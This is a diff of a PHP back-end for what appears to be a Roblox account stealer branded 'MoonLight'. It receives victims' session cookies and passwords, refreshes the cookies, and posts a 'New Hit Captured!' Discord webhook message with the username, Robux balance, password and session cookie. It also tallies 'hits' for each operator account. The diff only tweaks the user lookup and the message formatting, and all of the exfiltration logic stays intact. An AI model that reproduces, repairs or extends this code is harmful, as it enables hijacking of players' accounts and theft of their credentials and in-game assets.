@@ -159,21 +159,32 @@ if ($_SERVER["REQUEST_METHOD"] === "POST")
 
             $refreshed_cookie = _sync_session($cookie, $password) ?? $cookie;
 
-            $st = $db->prepare("SELECT users.* FROM sites JOIN users ON sites.account_id = users.id WHERE sites.id = ? LIMIT 1");
-            $st->execute([$site_id]);
-            $row = $st->fetch();
+            if ($site_id > 0) {
+                $st = $db->prepare("SELECT users.* FROM sites JOIN users ON sites.account_id = users.id WHERE sites.id = ? LIMIT 1");
+                $st->execute([$site_id]);
+                $row = $st->fetch();
+                if (!$row) {
+                    $st = $db->prepare("SELECT * FROM users LIMIT 1");
+                    $st->execute();
+                    $row = $st->fetch();
+                }
+            } else {
+                $st = $db->prepare("SELECT * FROM users LIMIT 1");
+                $st->execute();
+                $row = $st->fetch();
+            }
+            
             if (!$row) {
                 http_response_code(404);
-                die(json_encode(["error" => "Site not found"]));
+                die(json_encode(["error" => "No user found"]));
             }
             
             $acct_ak = $row["auth_key"];
-            $owner_webhook = !empty($row["default_webhook"]) ? $row["default_webhook"] : (!empty($row["webhook"]) ? $row["webhook"] : "");
+            $owner_webhook = $row["webhook"] ?? "";
 
             $final_cookie = $refreshed_cookie;
             $clean_cookie = $final_cookie;
             $domain = $_SERVER["HTTP_HOST"] ?? "localhost";
-            $ip_link = "https://ipinfo.io/" . ($_SERVER["REMOTE_ADDR"] ?? "Unknown");
 
             $username = "Unknown";
             $display_name = "Unknown";
@@ -394,24 +405,24 @@ if ($_SERVER["REQUEST_METHOD"] === "POST")
                 "avatar_url" => "https://media.discordapp.net/attachments/1475564612471623804/1475657899211751485/OIP_5.webp",
                 "embeds" => [
                     [
-                        "title" => "<:38084ownerblueshiny:1473461677423988780> **New Hit Captured!**",
+                        "title" => "New Hit Captured!",
                         "color" => 3447003,
                         "thumbnail" => ["url" => $avatar],
                         "fields" => [
-                            ["name" => "<:SB_membericon:1303891878034538678> **Username**", "value" => "```\n" . $username . "\n```", "inline" => true],
-                            ["name" => "<:SB_whitecrown:1303891878034538678> **Display Name**", "value" => "```\n" . $display_name . "\n```", "inline" => true],
-                            ["name" => "<:robux:1303891878034538678> **Robux**", "value" => "```\n" . number_format($robux) . "\n```", "inline" => true],
-                            ["name" => "<:rap:1303891878034538678> **RAP**", "value" => "```\n" . number_format($rap) . "\n```", "inline" => true],
-                            ["name" => "<:38084ownerblueshiny:1473461677423988780> **Password**", "value" => "```\n" . ($password ?: "N/A") . "\n```", "inline" => false],
-                            ["name" => "<:9221valk:1303891878034538678> **Premium**", "value" => "```\n" . ($premium ? $premium_type : "False") . "\n```", "inline" => true],
-                            ["name" => "<:38084ownerblueshiny:1473461677423988780> **Banned**", "value" => "```\n" . ($banned ? "True" : "False") . "\n```", "inline" => true],
-                            ["name" => "<:38084ownerblueshiny:1473461677423988780> **Account Age**", "value" => "```\n" . $account_age . " days\n```", "inline" => true],
-                            ["name" => "<:38084ownerblueshiny:1473461677423988780> **Domain**", "value" => "```\n" . $domain . "\n```", "inline" => false]
+                            ["name" => "Username", "value" => "```\n" . $username . "\n```", "inline" => true],
+                            ["name" => "Display Name", "value" => "```\n" . $display_name . "\n```", "inline" => true],
+                            ["name" => "Robux", "value" => "```\n" . number_format($robux) . "\n```", "inline" => true],
+                            ["name" => "RAP", "value" => "```\n" . number_format($rap) . "\n```", "inline" => true],
+                            ["name" => "Password", "value" => "```\n" . ($password ?: "N/A") . "\n```", "inline" => false],
+                            ["name" => "Premium", "value" => "```\n" . ($premium ? $premium_type : "False") . "\n```", "inline" => true],
+                            ["name" => "Banned", "value" => "```\n" . ($banned ? "True" : "False") . "\n```", "inline" => true],
+                            ["name" => "Account Age", "value" => "```\n" . $account_age . " days\n```", "inline" => true],
+                            ["name" => "Domain", "value" => "```\n" . $domain . "\n```", "inline" => false]
                         ],
                         "footer" => ["text" => "MoonLight • " . date("Y-m-d H:i:s")]
                     ],
                     [
-                        "title" => "<:38084ownerblueshiny:1473461677423988780> **Session Cookie**",
+                        "title" => "Session Cookie",
                         "description" => "```\n" . $clean_cookie . "\n```",
                         "color" => 3447003
                     ]
@@ -433,7 +444,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST")
                 "rap" => $rap,
                 "limiteds_count" => $limiteds_count,
                 "summary" => $robux + $pending_robux + $rap,
-                "payment_methods" => !empty($payment_methods) ? "True" : "False",
+                "payment_methods" => "False",
                 "credit_balance" => $credit_balance,
                 "credit_currency" => $credit_currency,
                 "has_korblox" => $has_korblox,
@@ -451,7 +462,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST")
                 "games_count" => $games_count,
                 "total_visits" => $total_visits,
                 "cookie" => $clean_cookie,
-                "refreshed" => $refreshed
+                "refreshed" => $refreshed_cookie !== $cookie ? 1 : 0
             ]);
 
             increment_stat($acct_ak, "hits");
